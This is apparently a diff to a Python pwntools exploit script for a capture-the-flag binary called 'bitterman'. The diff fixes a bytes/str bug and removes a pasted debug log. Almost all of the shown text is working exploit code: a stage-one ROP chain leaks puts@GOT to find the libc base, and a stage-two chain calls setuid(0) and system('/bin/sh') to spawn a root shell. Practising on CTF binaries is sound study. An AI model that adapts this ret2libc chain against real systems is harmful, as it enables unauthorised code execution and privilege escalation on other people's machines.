@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/python3
 # -*- coding: utf-8 -*-
 from pwn import *
 
@@ -45,11 +45,10 @@ start = local if args.LOCAL else remote
 
 io = start()
 
-# Create a ROP object which looks up symbols in the binary.
-rop = ROP(exe)
-
 # Stage 1. Leak the offset
 # gadget to leak = pop_rdi + got_puts + plt_puts + plt_main
+# Create a ROP object which looks up symbols in the binary.
+rop = ROP(exe)
 rop.call(exe.sym.puts, [exe.got.puts])
 rop.call(exe.sym.main)
 log.info("Stage 1 ROP Chain:\n" + rop.dump())
@@ -67,62 +66,33 @@ io.recvuntil("Thanks!")
 # Leak puts@GOT location.
 leaked_puts = u64((io.recv()[:8].strip().ljust(8, b'\x00')))
 log.info(f'Leaked puts@GOT: {leaked_puts}')
+log.info(f'puts@GLIBC: {hex(libc.sym.puts)}')
 
 # Stage 2. Code Execution
 # Gadget to code execution "pop_rdi + p64(0) + setuid_loc + pop_rdi + binsh_loc + system_loc"
 # The second stage will be shorter because libc.address sets the offset and simplifies the search of *_loc.
 libc.address = leaked_puts - libc.sym.puts
-log.info(f'PUTS@GLIBC: {libc.sym.puts}')
-log.info(f'@GLIBC offset: {libc.address}')
+setuid = libc.sym.setuid
+system = libc.sym.system
+binsh = next(libc.search('/bin/sh\x00'.encode()))
+
+log.info(f'offset@GLIBC: {hex(libc.address)}')
+log.info(f'offset + setuid@GLIBC: {hex(setuid)}')
+log.info(f'offset + system@GLIBC: {hex(system)}')
+log.info(f'offset + binbash@LIBC: {hex(binsh)}')
 
 rop2 = ROP(exe)
-system = libc.sym.system
-log.info(f'system@GLIBC: {hex(system)}')
-binsh = next(libc.search("/bin/sh"))
-log.info(f'binbash@LIBC: {binsh}')
+rop2.call(setuid, [0])
 rop2.call(system, [binsh])
 # Print the status of the ROP2 Chain
 log.info("Stage 2 ROP Chain:\n" + rop2.dump())
 # Create the payload chain.
 payload2 = fit({152: rop2.chain()})
 
-# 19. Interaction with the program
+# Interaction with the program
 io.sendline("Daniel")
 io.recvuntil("message:")
 io.sendline("1024")
 io.recvuntil("text:")
 io.sendline(payload2)
 io.interactive()
-'''
-# ./bitterman-300_rop_libcputs_pwnlib.py LOCAL DEBUG
-[*] Mapping binaries
-[*] '/opt/bitterman-300/bitterman'
-    Arch:     amd64-64-little
-    RELRO:    No RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-[*] '/lib/x86_64-linux-gnu/libc.so.6'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-[+] Starting local process '/opt/bitterman-300/bitterman': pid 2284
-[*] Loaded cached gadgets for './bitterman'
-[*] Stage 1 ROP Chain:
-    0x0000:         0x400853 pop rdi; ret
-    0x0008:         0x600c50 [arg0] rdi = got.puts
-    0x0010:         0x40051c
-    0x0018:         0x4006ec 0x4006ec()
-[*] Leaked puts@GOT: 0x7f02d92ca040
-[*] PUTS@GLIBC: 0x7f02d92ca040
-[*] @GLIBC offset: 0x7f02d9256000
-[*] system@GLIBC: 0x7f02d929cff0
-Traceback (most recent call last):
-  File "./bitterman-300_rop_libcputs_pwnlib.py", line 81, in <module>
-    binsh = next(libc.search("/bin/sh"))
-  File "/usr/local/lib/python3.7/dist-packages/pwnlib/elf/elf.py", line 1097, in search
-    offset = data.find(needle, offset)
-TypeError: argument should be integer or bytes-like object, not 'str'
-'''
